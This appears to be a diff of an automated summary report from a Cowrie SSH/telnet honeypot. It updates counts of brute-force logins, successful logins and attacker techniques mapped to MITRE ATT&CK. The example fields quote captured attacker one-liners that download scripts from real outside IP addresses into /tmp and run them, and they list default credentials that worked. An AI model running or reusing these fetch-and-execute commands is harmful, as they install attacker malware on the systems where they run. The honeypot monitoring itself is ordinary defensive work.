@@ -1,18 +1,18 @@
 {
   "log_file": "/home/cowrie/honeypot/var/log/cowrie/cowrie.json",
-  "generated": "2026-08-25 11:01:56",
+  "generated": "2026-08-25 12:00:45",
   "totals": {
-    "commands": 612,
-    "login_failed": 1135,
-    "login_success": 146,
-    "sessions": 1566
+    "commands": 641,
+    "login_failed": 1174,
+    "login_success": 156,
+    "sessions": 1615
   },
   "techniques": [
     {
       "id": "T1110.001",
       "name": "Brute Force: Password Guessing",
       "tactic": "Credential Access",
-      "count": 1135,
+      "count": 1174,
       "examples": [
         "root / 12345678",
         "root / 123456789",
@@ -21,14 +21,14 @@
         "root / Password1"
       ],
       "first": "2026-08-25T00:00:38.643564Z",
-      "last": "2026-08-25T10:58:07.713063Z",
-      "unique_ips": 97
+      "last": "2026-08-25T12:00:37.903153Z",
+      "unique_ips": 105
     },
     {
       "id": "T1078",
       "name": "Valid Accounts",
       "tactic": "Initial Access",
-      "count": 146,
+      "count": 156,
       "examples": [
         "root / root",
         "root / neworangetech",
@@ -37,14 +37,14 @@
         "admin / 1234"
       ],
       "first": "2026-08-25T00:17:08.525783Z",
-      "last": "2026-08-25T10:58:12.191287Z",
-      "unique_ips": 40
+      "last": "2026-08-25T12:00:38.387154Z",
+      "unique_ips": 41
     },
     {
       "id": "T1105",
       "name": "Ingress Tool Transfer",
       "tactic": "Command and Control",
-      "count": 60,
+      "count": 68,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -53,14 +53,14 @@
         "http://176.65.139.202:80/telnet.sh"
       ],
       "first": "2026-08-25T01:41:49.523664Z",
-      "last": "2026-08-25T09:53:55.927660Z",
-      "unique_ips": 6
+      "last": "2026-08-25T11:46:25.054775Z",
+      "unique_ips": 7
     },
     {
       "id": "T1222.002",
       "name": "File and Directory Permissions Modification: Linux and Mac",
       "tactic": "Defense Evasion",
-      "count": 42,
+      "count": 44,
       "examples": [
         "(cd /tmp; wget http://5.182.210.174/ok; curl -O http://5.182.210.174/ok; chmod +x ok; sh ok; rm -rf ok; rm -rf ok.1) >/d",
         "(cd /tmp||cd /var/tmp||cd /dev;rm -rf ok ok.1;busybox wget http://5.182.210.174/ok;wget http://5.182.210.174/ok;/userfs/",
@@ -69,8 +69,8 @@
         "curl http://176.65.139.202:80/telnet.sh -o /tmp/telnet.sh;chmod 777 /tmp/telnet.sh;sh /tmp/telnet.sh"
       ],
       "first": "2026-08-25T01:41:49.523664Z",
-      "last": "2026-08-25T09:53:55.496606Z",
-      "unique_ips": 8
+      "last": "2026-08-25T11:46:22.428873Z",
+      "unique_ips": 9
     },
     {
       "id": "T1082",
@@ -211,15 +211,15 @@
     ],
     [
       "shell",
-      99
+      108
     ],
     [
       "sh",
-      98
+      107
     ],
     [
       "system",
-      97
+      106
     ],
     [
       "enable",
